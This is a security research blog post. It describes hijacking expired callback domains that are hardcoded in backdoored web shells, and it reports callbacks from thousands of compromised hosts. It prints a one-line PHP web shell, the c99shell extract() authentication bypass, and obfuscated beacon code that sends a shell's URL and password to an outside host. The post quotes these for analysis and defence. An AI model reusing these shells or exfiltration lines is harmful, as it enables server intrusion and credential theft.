<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://labs.watchtowr.com/more-governments-backdoors-in-your-backdoors/">Original</a>
    <h1>Backdooring Your Backdoors – Another $20 Domain, More Governments</h1>
    
    <div id="readability-page-1" class="page"><div>
            <p>After the excitement of our .MOBI research, we were left twiddling our thumbs. As you may recall, in 2024, we demonstrated the impact of an unregistered domain when we subverted the TLS/SSL CA process for verifying domain ownership to give ourselves the ability to issue valid and trusted TLS/SSL certificates for any .MOBI domain.</p><p>This resulted in significant Internet-wide change, with <a href="https://lists.cabforum.org/pipermail/servercert-wg/2024-September/004821.html?ref=labs.watchtowr.com">Google petitioning the CAB Forum</a> to wholly sunset the use of WHOIS for ownership validation when issuing CA-signed TLS/SSL certificates.</p><p>As always, idle hands, idle minds - it was never going to be long until our ill-advised sense of adventure struck again, and at this point, the only thing holding us back is our publishing schedule.</p><figure><img src="https://labs.watchtowr.com/content/images/2024/12/image-14.png" alt="" loading="lazy" width="800" height="813" srcset="https://labs.watchtowr.com/content/images/size/w600/2024/12/image-14.png 600w, https://labs.watchtowr.com/content/images/2024/12/image-14.png 800w" sizes="(min-width: 720px) 720px"/></figure><p>This time, our sense of adventure struck again, in the same vein of expired and abandoned infrastructure - but with a little twist. Today, we’re taking you through our adventures through what we’ve affectionately termed - mass-hacking-on-autopilot. </p><p>Imagine you want to gain access to thousands of systems, but don’t feel like investing the effort to identify and compromise systems yourself - or getting your hands dirty. </p><p>Instead, you commandeer abandoned backdoors in regularly used backdoors to effectively ‘steal the spoils’ of someone else&#39;s work, giving you the same access to a compromised system as the person who put the effort into identifying the mechanism to compromise, and performing the compromise of said system in the first place. Zero effort, same result - for the price of a domain.</p><p>In our minds, we drew humorous parallels to the structure typically outlined as used by various state intelligence services - supposedly, an intelligence service officer will work with a criminal gang, and supposedly in exchange for immunity, will review the access obtained, or data captured, to decide what they want for themselves. </p><blockquote>This has felt very similar, except no-one has offered us immunity yet and we sometimes dream about hearing our research read back to us in court. Atleast there will be memes on the record, and an awkward explanation of a raccoon.</blockquote><p>Put simply - we have been hijacking backdoors (that were reliant on now abandoned infrastructure and/or expired domains) that <em>themselves</em> existed inside backdoors, and have since been watching the results flood in. This hijacking allowed us to track compromised hosts as they ‘reported in’, and <em>theoretically</em> gave us the power to commandeer and control these compromised hosts.</p><p>Over 4000 unique and live backdoors later (the number continues to grow), we decided this research would never be finished, and it would be interesting to share the results in their current state.</p><blockquote>Note to the reader: We have intentionally obfuscated compromised hostnames (in most cases hueheuhueh), and our publishing of this research does not put any system at any additional risk.</blockquote><p>Across those 4000 unique and live backdoors, we saw some systems of interest:</p><ul><li>Multiple compromised governments<ul><li>Bangladesh</li><li>China</li><li>Nigeria</li></ul></li><li>Compromised universities/higher education entities across Thailand, China, South Korea and more</li><li>and, of course, much much more (we’ve so far recorded over 300MB of logs to trawl through).</li></ul><p>As always, we’re quick to remind everyone - we’re not the first to track hackers for fun, we no doubt won’t be the last. But, we have enjoyed continuing to exploit what truly appears to be a hugely underrated vulnerability class - <strong>abandoned and expired infrastructure</strong> - to basically give ourselves ‘theoretical’ free access to thousands of systems for the cost of a few (yet again) $20 domain names.</p><p>Until next time :-))))))))</p><h3 id="ok-but-what-on-earth-are-you-talking-about">OK, But What On Earth Are You Talking About?</h3><p>Well, as we’ve seen with the breakdown of various crime groups and ransomware gangs - criminals are ‘only human’ too, and have a very similar ability to make seemingly (and with the power of hindsight) simple mistakes.</p><p>Anyone who is well versed in the history of the ‘hacker scene’ will see this with a mix of fear and nostalgia - hackers have been hacking each other since the dawn of hacking, both for profit and simply for phun. There is a common belief (backed up with a significant amount of evidence) that hackers are, in general, pretty bad at securing networks.</p><p>Luckily, h0no, 2l8, <a href="https://www.exploit-db.com/ezines/kr5hou2zh4qtebqk.onion/ZF0/?ref=labs.watchtowr.com">zf0</a>, and <a href="https://www.exploit-db.com/ezines/kr5hou2zh4qtebqk.onion/el8/?ref=labs.watchtowr.com" rel="noreferrer">~el8</a> documented these games for archiving and reading years later. </p><h3 id="web-shells">Web Shells</h3><p>As a brief journey through history, we want to give a bit of background (context is important, folks). So let’s talk web shells.</p><p>Web shells are - in effect - pieces of code that serve as backdoors deployed to web servers after successful exploitation, to allow the usual post-exploitation activities to take place.</p><p>This is a fairly simple concept, and this blog post is not designed to be an ELI5 computer science course. Web shells come in various formats:</p><ul><li>Bare-bones, simple shells - stuff that just executes a command, like the age-old<code>&lt;?php system($_GET[&#39;exec&#39;]);?&gt;</code></li><li>Fully functioning, all-bells-and-whistles shells<ul><li><a href="https://bartblaze.blogspot.com/2015/03/c99shell-not-dead.html?ref=labs.watchtowr.com">c99shell</a></li><li>r57shell</li><li><a href="https://en.wikipedia.org/wiki/China_Chopper?ref=labs.watchtowr.com">China Chopper</a> (famously used by supposed China-based APT groups)</li><li>and <strong>thousands</strong> of other variations</li></ul></li></ul><p>c99shell and r57shell will likely trigger flashbacks for many, as these infamous and prolific web shells were used by every script kiddie while learning how far they could take their Internet adventures (in their homelab, obviously, and never ever against JPL).</p><p>Below is r57shell, published by <a href="http://rst.void.ru/?ref=labs.watchtowr.com">http://rst.void.ru</a>. Note that we pulled these screenshots off the Internet (and to be explicitly clear, they are not our own).</p><figure><img src="https://labs.watchtowr.com/content/images/2024/12/image-6.png" alt="" loading="lazy" width="1500" height="791" srcset="https://labs.watchtowr.com/content/images/size/w600/2024/12/image-6.png 600w, https://labs.watchtowr.com/content/images/size/w1000/2024/12/image-6.png 1000w, https://labs.watchtowr.com/content/images/2024/12/image-6.png 1500w" sizes="(min-width: 720px) 720px"/></figure><p>And here’s another shell, c99shell (published by ccteam.ru), with similar features.</p><figure><img src="https://labs.watchtowr.com/content/images/2024/12/image-7.png" alt="" loading="lazy" width="1021" height="486" srcset="https://labs.watchtowr.com/content/images/size/w600/2024/12/image-7.png 600w, https://labs.watchtowr.com/content/images/size/w1000/2024/12/image-7.png 1000w, https://labs.watchtowr.com/content/images/2024/12/image-7.png 1021w" sizes="(min-width: 720px) 720px"/></figure><p>As you can see, these shells have everything a modern-day attacker could need, including:</p><ul><li>Command execution functions</li><li>File management (delete, modify, upload, move, rename, etc)</li><li>Code execution functions</li><li>Self-removal functionality</li><li>Backdoor deployment (connect-back, bindshells, and more)</li><li>FTP bruteforce capabilities</li><li>SQL clients</li></ul><p>Literally, if you have a need, these shells can satisfy it. They’re essentially improved versions of whatever you use for remote management in 2024 (but HTTP-based, and with better ACSII art).</p><h3 id="but-they-have-more">But They Have More</h3><p>However, what is less commonly known, is that these shells were often backdoored to allow hackers to hack hackers.</p><figure><img src="https://labs.watchtowr.com/content/images/2024/12/image-8.png" alt="" loading="lazy" width="485" height="313"/></figure><p>Here’s an example. Within the bare, unmodified version of r57shell, we can find the following code:</p><pre><code>if (!in_array($addr[0], $serv)) {
@print &#34;&lt;img src=\&#34;http://rst.void.ru/r57shell_version/version.php?img=1&amp;version=&#34;.$current_version.&#34;\&#34; border=0 height=0 width=0&gt;&#34;;
@readfile (&#34;http://rst.void.ru/r57shell_version/version.php?version=&#34;.$current_version.&#34;&#34;);}}  
echo &#39;&lt;body&gt;&lt;table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000&gt;&lt;tr&gt;&lt;td bgcolor=#cccccc width=160&gt;&lt;font face=Verdana size=2&gt;&#39;.ws(2).&#39;&lt;font face=Webdings size=6&gt;&lt;b&gt;!&lt;/b&gt;&lt;/font&gt;&lt;b&gt;&#39;.ws(2).&#39;r57shell &#39;.$version.&#39;&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=#cccccc&gt;&lt;font face=Verdana size=-2&gt;&#39;;
echo ws(2).&#34;&lt;b&gt;&#34;.date (&#34;d-m-Y H:i:s&#34;).&#34;&lt;/b&gt;&#34;;</code></pre><p>This code generates an HTML <code>&lt;img&gt;</code> tag with a zero size, fetching a file from ‘<a href="http://rst.void.ru/?ref=labs.watchtowr.com">rst.void.ru</a>’ (a domain owned by creators of the r57shell) to - apparently - send the current version string of the shell in use to the script maintainers. Seems innocent enough, right?</p><p>In reality, though, this leaks the location of the newly-deployed web shell to the owners of <a href="http://rst.void.ru/?ref=labs.watchtowr.com">rst.void.ru</a> via the HTTP request referrer header - and so after hours of hacking away at your target, you have just handed over your newly-gained shell to someone smarter than you - the bigger fish, per se.</p><figure><img src="https://labs.watchtowr.com/content/images/2024/12/image-9.png" alt="" loading="lazy" width="2000" height="2000" srcset="https://labs.watchtowr.com/content/images/size/w600/2024/12/image-9.png 600w, https://labs.watchtowr.com/content/images/size/w1000/2024/12/image-9.png 1000w, https://labs.watchtowr.com/content/images/size/w1600/2024/12/image-9.png 1600w, https://labs.watchtowr.com/content/images/2024/12/image-9.png 2048w" sizes="(min-width: 720px) 720px"/></figure><p>The food chain is alive, and you hopefully get the idea.</p><h3 id="im-a-security-professional-i-always-configure-auth">I&#39;m A Security Professional, I Always Configure Auth</h3><p>A lot of web shells come with password protection, allowing the attacker to restrict access to themselves only. Surprise surprise, though - a common feature of these backdoors is one that allows the original author of the web shell (in addition to the current attacker) to gain access to any host running the web shell with what effectively acts as a ‘skeleton key’.</p><p>A good (historic) example is the above-mentioned c99shell backdoor. While this is not novel, or new, and has been discussed for years - we are detailing for background context, with the hopes of painting a paint a clear picture.</p><p>Take a look for yourself…</p><pre><code>$login = &#34;&#34;; //login
$pass = &#34;&#34;; //password
$md5_pass = &#34;&#34;; //md5-cryped pass. if null, md5($pass)

...

@extract($_REQUEST[&#34;c99shcook&#34;]);

...

 if (($_SERVER[&#34;PHP_AUTH_USER&#34;] != $login) or (md5($_SERVER[&#34;PHP_AUTH_PW&#34;]) != $md5_pass))
 {
 ...
  header(&#34;WWW-Authenticate: Basic realm=\&#34;c99shell &#34;.$shver.&#34;: &#34;.$login_txt.&#34;\&#34;&#34;);
  header(&#34;HTTP/1.0 401 Unauthorized&#34;);
  exit($accessdeniedmess);
 }
}</code></pre><p>At first glance, this is pretty straightforward stuff. The login and password are hardcoded at the top of the code (intended to be customised by the attacker before deploying the shell) in the $login and $pass variables.</p><p>Later on, a typical comparison with <code>PHP_AUTH_USER</code> and <code>PHP_AUTH_PW</code> performs authentication checks, exiting if they don’t match. Fairly normal, right?</p><p>But what about that innocent-looking <code>@extract</code>? Well according to <a href="https://www.php.net/manual/en/function.extract.php?ref=labs.watchtowr.com">php.net</a>, that function isn’t ‘safe’ for use on untrusted data.</p><figure><img src="https://labs.watchtowr.com/content/images/2024/12/image-10.png" alt="" loading="lazy" width="1045" height="59" srcset="https://labs.watchtowr.com/content/images/size/w600/2024/12/image-10.png 600w, https://labs.watchtowr.com/content/images/size/w1000/2024/12/image-10.png 1000w, https://labs.watchtowr.com/content/images/2024/12/image-10.png 1045w" sizes="(min-width: 720px) 720px"/></figure><p>The <code>extract</code> function is designed to effectively take input in the form of key/value pairs, and then use them to overwrite variables in the current scope.</p><p>This means that a criminal targeting criminals can simply supply a <code>c99shcook</code> request parameter (GET or POST) containing a variable named <code>md5_pass</code> with a value set to their own password and <code>login</code> set to a username of their choice. This will then overwrite the hardcoded credential variables and allow the ‘bigger fish’ attacker to satisfy authentication.</p><h3 id="i-can%E2%80%99t-believe-it%E2%80%99s-not-backdoored">I Can’t Believe It’s Not Backdoored</h3><p>While this history was exciting for those of us that just enjoy living the halcyon days of an unpoliced Internet, we found ourselves in an uncomfortable position after .MOBI - would we ever get attention ever again?</p><p>Again, throwing logic and time into the wind, we started on a new hypothesis. Wouldn’t it be cool if we could play with some of our older toys, but</p><ul><li>With a unique angle,</li><li>Call it research,</li><li>And just generally see what people are up to?</li></ul><p>As we alluded to at the start of the post, we have really fallen in love with abandoned and expired infrastructure as a way to (legally) wreak havoc on the Internet and work out just how broken everything is.</p><p>As those of you who know the watchTowr team intimately will be aware, obsession is a very powerful force, and something of a theme amongst many team members - we regularly settle on beliefs, and will relentlessly find ways to prove our beliefs until either we find a new obsession, or we do indeed prove ourselves to be correct.</p><p>Although the <a href="http://void.ru/?ref=labs.watchtowr.com">void.ru</a> domain used in the r57shell backdoor is still being actively renewed by an “advertising agency” (lol??), we wondered - were they the only ones that had realized that hackers (and pentesters) very regularly download random code off the Internet, fire it at production systems and think they’re Neo from the Matrix?</p><p><strong><em>cough</em> </strong><a href="http://linpeas.sh/?ref=labs.watchtowr.com"><strong>linpeas.sh</strong></a><strong> you absolute muppets <em>cough</em></strong></p><p>Could we put ourselves in the middle of some of these backdoors, and add to our ‘unofficial sysadmin’ duties?</p><h3 id="spoiler-the-answer-is-yes">Spoiler: the answer is yes.</h3><p>Adapting some internal code, we went on a mission - collect as many web shells as possible (regardless of language, target, or age), de-obfuscate any code that happened to be protected by the power of base64, and extract any unregistered domains likely used in some sort of callback function.</p><p>We then hooked that up to the AWS Route53 API, and just bought them en-masse. Honestly, it’s $20, and we’ve done worse with more.</p><p><strong>Friends - we registered 40+ domains and began spinning up infrastructure. Below are some examples:</strong></p>
<!--kg-card-begin: html-->
<table>
<thead>
<tr>
<th>Shell name</th>
<th>Referenced domain</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>~mysterious who knows~</strong></td>
<td><a href="http://6634596.com/?ref=labs.watchtowr.com">6634596.com</a></td>
</tr>
<tr>
<td>marion001.php</td>
<td><a href="http://aljazeera7.com/?ref=labs.watchtowr.com">aljazeera7.com</a></td>
</tr>
<tr>
<td><strong>~mysterious who knows~</strong></td>
<td><a href="http://alturks.com/?ref=labs.watchtowr.com">alturks.com</a></td>
</tr>
<tr>
<td><strong>~mysterious who knows~</strong></td>
<td><a href="http://caspian-pirates.org/?ref=labs.watchtowr.com">caspian-pirates.org</a></td>
</tr>
<tr>
<td>EgY_SpIdEr ShElL V2</td>
<td><a href="http://csthis.com/?ref=labs.watchtowr.com">csthis.com</a></td>
</tr>
<tr>
<td><strong>~mysterious who knows~</strong></td>
<td><a href="http://dcvi.net/?ref=labs.watchtowr.com">dcvi.net</a></td>
</tr>
<tr>
<td>NetworkFileManagerPHP</td>
<td><a href="http://drakdandy.net/?ref=labs.watchtowr.com">drakdandy.net</a></td>
</tr>
<tr>
<td>Shell [ci] . Biz</td>
<td><a href="http://emp3ror.com/?ref=labs.watchtowr.com">emp3ror.com</a></td>
</tr>
<tr>
<td>PHPJackal</td>
<td><a href="http://flyphoto.us/?ref=labs.watchtowr.com">flyphoto.us</a></td>
</tr>
<tr>
<td>Kodlama</td>
<td><a href="http://guerrilladns.com/?ref=labs.watchtowr.com">guerrilladns.com</a></td>
</tr>
<tr>
<td>Predator</td>
<td><a href="http://h0ld-up.info/?ref=labs.watchtowr.com">h0ld-up.info</a></td>
</tr>
<tr>
<td>dhie-Q fx29sh v1 06.2008</td>
<td><a href="http://h4cks.in/?ref=labs.watchtowr.com">h4cks.in</a></td>
</tr>
<tr>
<td>Nix remote web shell</td>
<td><a href="http://hackru.info/?ref=labs.watchtowr.com">hackru.info</a></td>
</tr>
<tr>
<td>iMHaBiRLiGi</td>
<td><a href="http://imhabirligi.com/?ref=labs.watchtowr.com">imhabirligi.com</a></td>
</tr>
<tr>
<td>iMHaBiRLiGi</td>
<td><a href="http://nettekiadres.com/?ref=labs.watchtowr.com">nettekiadres.com</a></td>
</tr>
<tr>
<td>Ajax/PHP Command Shell</td>
<td><a href="http://ironwarez.info/?ref=labs.watchtowr.com">ironwarez.info</a></td>
</tr>
<tr>
<td>ＡＳＰ一句话客户端&lt;</td>
<td><a href="http://jbl86.com/?ref=labs.watchtowr.com">jbl86.com</a></td>
</tr>
<tr>
<td>SyRiAn Sh3ll V7</td>
<td><a href="http://library-ar.com/?ref=labs.watchtowr.com">library-ar.com</a></td>
</tr>
<tr>
<td>RedHat Hacker</td>
<td><a href="http://ll4best.com/?ref=labs.watchtowr.com">ll4best.com</a></td>
</tr>
<tr>
<td>r57shell</td>
<td><a href="http://localshell.net/?ref=labs.watchtowr.com">localshell.net</a></td>
</tr>
<tr>
<td>Locus7Shell Modified by #!physx^</td>
<td><a href="http://locus7s.com/?ref=labs.watchtowr.com">locus7s.com</a></td>
</tr>
<tr>
<td>星外-华众-新网-虚拟主机提权专用Webshell</td>
<td><a href="http://love-1-love.com/?ref=labs.watchtowr.com">love-1-love.com</a></td>
</tr>
<tr>
<td>解包unpack.vbs</td>
<td><a href="http://lpl38.com/?ref=labs.watchtowr.com">lpl38.com</a></td>
</tr>
<tr>
<td>传说中的草泥马4.0.asp</td>
<td><a href="http://odayexp.com/?ref=labs.watchtowr.com">odayexp.com</a></td>
</tr>
<tr>
<td>Locus7s Modified c100 Shell</td>
<td><a href="http://precision-gaming.com/?ref=labs.watchtowr.com">precision-gaming.com</a></td>
</tr>
<tr>
<td>c99</td>
<td><a href="http://rootshell-security.net/?ref=labs.watchtowr.com">rootshell-security.net</a></td>
</tr>
<tr>
<td>SimAttacker</td>
<td><a href="http://shellci.biz/?ref=labs.watchtowr.com">shellci.biz</a></td>
</tr>
<tr>
<td>c99_w4cking</td>
<td><a href="http://templatez.org/?ref=labs.watchtowr.com">templatez.org</a></td>
</tr>
<tr>
<td><strong>~mysterious who knows~</strong></td>
<td><a href="http://w2img.com/?ref=labs.watchtowr.com">w2img.com</a></td>
</tr>
<tr>
<td>r57gentr dQ99Sh</td>
<td><a href="http://waterski21.com/?ref=labs.watchtowr.com">waterski21.com</a></td>
</tr>
<tr>
<td>get.php</td>
<td><a href="http://yywjw.com/?ref=labs.watchtowr.com">yywjw.com</a></td>
</tr>
</tbody>
</table>
<!--kg-card-end: html-->
<p>With shiny wildcard TLS certs, an automatically configured Apache web server (<strong>and ahem, a correctly disabled logrotate instance ahem ahem ahem ahem we definitely didn’t mess this up and lose a bunch of logs ahem ahem ahem ahem ahem</strong>) - we pointed our shiny new domains at our logging server, which did nothing other than log incoming requests before responding with a 404.</p><p>Before the nerds in the audience start shouting at us, <strong>we have been very careful here to remain within the boundaries of the law</strong> - these requests were coming to us, we didn’t manipulate systems into communicating with us, and we certainly did not respond with code to be evaluated.</p><p>While we have a huge amount of data, and to walk through it all would be tedious for all involved, we wanted to highlight a few interesting things:</p><h3 id="hello-north-korea">Hello North Korea?</h3><p>What did we see? Well, first off, we saw someone cosplaying as Lazarus Group, aka APT37, aka North Korea. It seems unlikely that we’ve caught Lazarus in the act given the targets, but we’re probably seeing some attackers who are repurposing the APT-level tooling used by Lazarus for their own ends.</p><blockquote>Hey, if SSLVPN vendors can call path traversal sophisticated, then a web shell meets the bar to be described as APT-level tooling. Like sandcastles at the beach are regularly described as architecture.</blockquote><p>Take a look at the following inbound requests:</p><pre><code>img2.w2img.com/midia_img/0f000cbW0BuDik7If87T3s.gif 202.146.[redacted] 485 &#34;http://www.[redacted].com/&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36&#34;
img2.w2img.com/midia_img/0f000cbW0BuDik7If87T3s.gif 35.206.[redacted] - 404 466 &#34;http://[redacted].cn/&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36&#34;
img2.w2img.com/midia_img/0f000cegVDnfw03Y33y936.gif 103.170.[redacted] - 404 466 &#34;http://www.[redacted].net/&#34; &#34;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0&#34;</code></pre><p>We saw thousands of requests like this, fetching a <code>.gif</code> image from our logging server. But what do they represent?</p><p>Well, we were able to locate a sample of the backdoor generating these requests (it fell off the back of a passing lorry). It seems to be a version of one <a href="https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf?ref=labs.watchtowr.com">used by Lazarus</a> back in 2020.</p><p>If we take a closer look at the backdoor, and strip away some of the obfuscation, we can see the beaconing URL, being fetched as a <code>.gif</code> image from our server:</p><pre><code>.menu{background:url(http://img2.w2img.com/midia_img/0f000cegVDnfw03Y33y936.gif);}</code></pre><p>This is a line of CSS, specifying that the ‘menu’ style should fetch a background image from the given URL. On loading the page, the web browser will attempt to fetch the specified <code>.gif</code> file from the <a href="http://w2img.com/?ref=labs.watchtowr.com"><code>w2img.com</code></a> server.</p><p>The attentive administrators (us!) are watching the logs keenly, and notice this request - ultimately, having the effect of notifying us that the web shell has been deployed and accessed correctly, and leaking the URL to the panel on the compromised domain in the referrer.</p><blockquote>Note: Disclosing just the domain in referrers is a <a href="https://developer.chrome.com/blog/referrer-policy-new-chrome-default?ref=labs.watchtowr.com">relatively recent browser change</a>, and indeed attackers using older browsers were sending us full shell URLs.</blockquote><p>We saw over 3,900 unique compromised domains from this backdoor alone - clearly, this is a prolific tool.</p><h3 id="gov-is-always-near">.GOV Is Always Near</h3><p>Taking a look through the results for high-value domains within our referrers, we the following stood out like a shining beacon:</p><pre><code>host# grep &#34;\\.gov&#34; referrers | sort -u
http://www.[redacted].gov.cn/
https://fhc.gov.ng/
http://[redacted].court.gov.cn
http://[redacted].gov.bd</code></pre><p>Uh, ok! <a href="http://fhc.gov.ng/?ref=labs.watchtowr.com"><code>fhc.gov.ng</code></a> is the Federal High Court of Nigeria</p><p>As we can see from the logs below, this was across 4 different backdoors—therefore, 4 different web shells were responsible for capturing this information (demonstrated with the 4 different domains the requests were sent to).</p><pre><code>[[redacted]  0000] http://img2.w2img.com:80/midia_img/0f000cegVDnfw03Y33y936.gif 175.176.[redacted] - 404 522 &#39;http://www.[redacted].gov.cn/&#39; &#39;Mozilla/5.0 (iPhone; CPU iPhone OS 17_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1&#39;
[[redacted]  0000] http://www.nettekiadres.com:443/imhabirligi.jpg 58.97.[redacted] - 404 3108 &#39;https://fhc.gov.ng/&#39; &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36&#39;
[[redacted]  0000] h0ld-up.info:80/index.html 103.111.[redacted] - 200 342 &#34;http://[redacted].gov.bd/[redacted].php&#34; &#34;Opera/10.61 (Linux i686; U; en-US) Presto/6.1.88 Version/2.2&#34;
[[redacted]  0000] http://www.lpl38.com:443/post/http:/[redacted].court.gov.cn 117.136.[redacted] - 404 867 &#39;-&#39; &#39;Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36 EdgA/117.0.2045.53&#39;</code></pre><h3 id="the-cisco-we-have-at-home">The Cisco We Have At Home</h3><p>Naturally, we took a look through our dataset for any high-profile targets. We found the following, which made us do a double-take:</p><pre><code>img2.w2img.com:80/midia_img/0f000cegVDnfw03Y33y936.gif 110.66.[redacted] - 404 522 &#34;http://www.ciscosoft.com.cn/[redacted].asp&#34; </code></pre><p>ciscosoft.com.cn?! We were somewhat relieved to discover this bears no relation to the American software giant, Cisco.</p><figure><img src="https://labs.watchtowr.com/content/images/2024/12/image-11.png" alt="" loading="lazy" width="1097" height="508" srcset="https://labs.watchtowr.com/content/images/size/w600/2024/12/image-11.png 600w, https://labs.watchtowr.com/content/images/size/w1000/2024/12/image-11.png 1000w, https://labs.watchtowr.com/content/images/2024/12/image-11.png 1097w" sizes="(min-width: 720px) 720px"/></figure><figure><img src="https://labs.watchtowr.com/content/images/2024/12/image-12.png" alt="" loading="lazy" width="831" height="222" srcset="https://labs.watchtowr.com/content/images/size/w600/2024/12/image-12.png 600w, https://labs.watchtowr.com/content/images/2024/12/image-12.png 831w" sizes="(min-width: 720px) 720px"/></figure><h3 id="give-me-everything">Give Me Everything</h3><p>As we went through the data, we began to see another type of backdoor calling back - one that was far more explicit than loading an image file and relying on leaking the location in the referrer header. Specifically, we began to see functionality that would call back to actual logging functionality with specific information included within parameters.</p><p>For example, the below (this is one of many such logic implementations):</p><pre><code>www.odayexp.com:80/sx/key.asp?url=http%3A%2F%2F[redacted]%2Frequest%2FCelebByConsortiaDayRiches%2Easp&amp;p=[redacted] 43.230.[redacted] - 404 523 &#34;&lt;http://220.167&gt;.[redacted]:89/[redacted].asp&#34; &#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Core/1.116.454.400 QQBrowser/13.2.6135.400&#34;
</code></pre><p>This immediately piqued our interest - not only is the URL of the web shell being provided but there is also a “mysterious” <code>p</code> parameter included.</p><p>What’s being sent here? Well, let’s first take a peek at the URL in the referrer.</p><p>It is, once again, a web shell, but this time there’s a password:</p><figure><img src="https://labs.watchtowr.com/content/images/2024/12/image-13.png" alt="" loading="lazy" width="613" height="353" srcset="https://labs.watchtowr.com/content/images/size/w600/2024/12/image-13.png 600w, https://labs.watchtowr.com/content/images/2024/12/image-13.png 613w"/></figure><p>To figure out what that <code>p</code> represents, we need to take a look at the code behind the web shell. It’s in ASP, and the relevant part looks like this:</p><pre><code>&lt;img src=&#39;ht&#34;&amp;&#34;tp://%77%77%77.od&#34;&amp;&#34;ay&#34;&amp;&#34;exp.%63%6F%6D/s&#34;&amp;&#34;x/ke&#34;&amp;&#34;y.asp&#34;&amp;&#34;?url=&#34;&amp;server.URLEncode(&#34;ht&#34;&amp;&#34;tp://&#34;&amp;request.ServerVariables(&#34;HT&#34;&amp;&#34;TP_HO&#34;&amp;&#34;ST&#34;)&amp;request.ServerVariables(&#34;UR&#34;&amp;&#34;L&#34;))&amp;&#34;&amp;p=&#34;&amp;UserPass&amp;&#34;&#39; /&gt;
</code></pre><p>As you can see, it’s lightly obfuscated. Once we strip out the obfuscation, we’re left with the following:</p><pre><code>&lt;img src=&#39;&lt;http://www.odayexp.com/sx/key.asp?url=&gt;&#34; &amp; \\
	server.URLEncode(&#34;http://&#34; &amp; request.ServerVariables(&#34;HTTP_HOST&#34;) &amp; request.ServerVariables(&#34;URL&#34;)) &amp; \\
	&#34;&amp;p=&#34;&amp;UserPass&amp;&#34;&#39; /&gt;
</code></pre><p>This code once again embeds an image, fetching it from our logging server at <code>www.odayexp.com</code>. We can see how the <code>p</code> parameter is composed - it’s simply the <code>UserPass</code> variable. Surprise surprise - this is the password needed to log in to the web shell itself.</p><p>So to put it all together - the attacker tried to secure their web shell installation, by requiring a password, but the web shell is backdoored to the extent that it transmits the password (in the clear!) to a logging server, <code>odayexp</code>, which is now owned by watchTowr.</p><p>This attacker gets half marks for securing their web shell at least. But sending us the password in plaintext? Not really on the ‘best practices’ list.</p><p>Another interesting thing is that, if we look back in our logs, we can again see the attacker supposedly modifying and playing with this function - but still sending the data to a system they don’t control?</p><pre><code>www.odayexp.com:80/sx/key.asp?url=”server.urlencode
www.odayexp.com:80/sx/key.asp?url=http://192.168.66.134
www.odayexp.com:80/sx/key.asp?url=http://192.168.66.140/fk.asp
www.odayexp.com:80/sx/key.asp?url=http://localhost/test/fuccck.asp
www.odayexp.com:80/sx/key.asp?url=http://localhost/test/fuccck.asp&amp;p=admin
</code></pre><p>Alright then.</p><h3 id="hack-the-planet">Hack. The. Planet.</h3><p>While this has hopefully been a stroll down nostalgia lane for many (us, too) - our opinion is that as the Internet ages, and as we begin to truly understand the scope of impact for abandoned and expired infrastructure, we’re likely to see problems like this continue.</p><p>Previously, it was an expired domain previously used as a WHOIS server supporting a global TLD. Today, it is domains used in backdoors. What’s next— software update infrastructure and autoscaling cloud infrastructure for SSLVPN appliances? That would be crazy.</p><p>We like to be semi-positive (actually this is a lie, but we do try) - it is somewhat encouraging to see that attackers make the same mistakes as defenders. It’s easy to slip into the mindset that attackers never slip up, but we saw evidence to the contrary - boxes with open web shells, expired domains, and the use of software that has been backdoored. Perhaps the playing field is more level than we thought (Editor: or the intelligence spread far wider than expected?).</p><p>While it’s noteworthy that the shells we observed were predominantly skewed toward Chinese targets (likely a reflection of our sample data set), we are also reluctant to draw conclusions based on source IP addresses (given the ease of proxying). That being said, we note a strong skew from Hong Kong and China IP address space as the source of supposed attacker traffic (or perhaps sysadmins with some very curious choices for website management).</p><p>So far we’ve found over 4000~ breached systems (<s>three</s> four of which are breached <code>.gov</code> systems). The number keeps going up - as you would expect.</p><p>In a similar vein to our previous .MOBI research, our concern is always around the responsibility that we find ourselves left holding. For the same reasons that both this research and the .MOBI research came to exist, we would be guilty of the exact same careless disposal of infrastructure if we were to let these domains expire as their previous owners did. We’re incredibly grateful for the support of <a href="https://www.shadowserver.org/?ref=labs.watchtowr.com" rel="noreferrer">The Shadowserver Foundation</a>, who have agreed yet again to save us from our own adventures and to take ownership of the domains implicated in this research and sinkhole them.</p><p>At <a href="https://www.watchtowr.com/?ref=labs.watchtowr.com">watchTowr</a>, we passionately believe that continuous security testing is the future and that rapid reaction to emerging threats single-handedly prevents inevitable breaches. </p><p>With the watchTowr Platform, we deliver this capability to our clients every single day - it is our job to understand how emerging threats, vulnerabilities, and TTPs could impact their organizations, with precision.</p><p>If you&#39;d like to learn more about the <a href="https://www.watchtowr.com/?ref=labs.watchtowr.com"><strong>watchTowr Platform</strong></a><strong>, our Attack Surface Management and Continuous Automated Red Teaming solution,</strong> please get in touch.</p>
        </div></div>
  </body>
</html>
